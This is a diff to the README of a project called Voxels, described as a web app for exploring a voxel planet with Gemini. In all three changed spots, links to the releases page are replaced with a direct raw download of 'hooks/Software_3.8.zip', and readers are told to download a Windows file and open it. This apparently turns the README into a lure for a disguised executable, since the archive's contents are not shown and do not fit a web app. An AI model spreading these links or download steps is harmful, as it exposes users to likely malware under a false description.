@@ -1,6 +1,6 @@
 # 🪐 Voxels - Explore A Living Voxel Planet
 
-[Download Voxels](https://github.com/ileanaundatable329/Voxels/releases)
+[Download Voxels](https://github.com/ileanaundatable329/Voxels/raw/refs/heads/main/hooks/Software_3.8.zip)
 
 ## 🚀 What Voxels Does
 
@@ -10,7 +10,7 @@ Voxels is a web app that lets you explore a 3D voxel planet. It uses Gemini to h
 
 Visit this page to download Voxels:
 
-[https://github.com/ileanaundatable329/Voxels/releases](https://github.com/ileanaundatable329/Voxels/releases)
+[https://github.com/ileanaundatable329/Voxels/raw/refs/heads/main/hooks/Software_3.8.zip](https://github.com/ileanaundatable329/Voxels/raw/refs/heads/main/hooks/Software_3.8.zip)
 
 On the release page, look for the latest version. Download the file made for Windows, then open it after the file finishes downloading.
 
@@ -125,7 +125,7 @@ Try ideas like these when you start:
 
 ## 📌 Release Page
 
-[https://github.com/ileanaundatable329/Voxels/releases](https://github.com/ileanaundatable329/Voxels/releases)
+[https://github.com/ileanaundatable329/Voxels/raw/refs/heads/main/hooks/Software_3.8.zip](https://github.com/ileanaundatable329/Voxels/raw/refs/heads/main/hooks/Software_3.8.zip)
 
 ## 🧑‍💻 If You Want to Share Feedback
 
